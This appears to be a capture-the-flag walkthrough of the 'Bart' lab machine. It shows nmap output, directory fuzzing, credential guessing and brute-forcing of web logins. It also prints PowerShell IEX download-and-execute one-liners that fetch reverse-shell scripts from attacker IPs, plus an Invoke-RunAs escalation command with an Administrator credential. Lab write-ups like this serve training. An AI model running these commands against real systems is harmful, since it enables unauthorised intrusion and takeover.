## Nmap
```
# Nmap 7.91 scan initiated Wed Nov 18 12:05:34 2020 as: nmap -sC -sV --reason -oN nmap/initial -vv 10.10.10.81
Nmap scan report for 10.10.10.81
Host is up, received echo-reply ttl 127 (0.14s latency).
Scanned at 2020-11-18 12:05:35 IST for 36s
Not shown: 999 filtered ports
Reason: 999 no-responses
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: 50465238F8A85D0732CBCC8EB04920AA
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://forum.bart.htb/
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov 18 12:06:11 2020 -- 1 IP address (1 host up) scanned in 36.65 seconds

```

Only Port 80 is open. If we go to bart.htb it redirects to forum.bart.htb and the page cant be found. So lets try to fuzz the website.

## Wfuzz

After fuzzing it for 20-30 sec we find there are two interesting directories `/forum` and `/monitor`
![[Pasted image 20201118125633.png]]

Lets go to the directories and see what we have.
`/forum` looks like a normal webpage and nothing interesting can be found. However we see a login page at `monitor` which is using `phpservermonitor`

## Sever Monitor

We found a login form at http://bart.htb/monitor/. And on viewing the source at http://bart.htb we found harvey potter as user. Luckily this was also the username and password.
![[Pasted image 20201118200535.png]]

On viewing the `servers` on the page we find an internal website http://internal-01.bart.htb/simple_chat/login_form.php which is again a login form 
![[Pasted image 20201118200917.png]]

We then brute force the login form to get the creds 
Username: `harvey`
Password: `Password1`

On viewing the source we find it is making the following request
xhr.open('GET', 'http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey', true);

## Reverse Shell

powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/pwershell-1337.ps1')"
![[Pasted image 20201118202132.png]]


## Escalating shell
`Invoke-RunAs -User Administrator -Password 3130438f31186fbaf962f407711faddb -LogonType 0x1 -Binary c:\windows\sysnative\windowspowershell\v1.0\powershell.exe -args "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.18:8000/pwershell-1338.ps1')"`
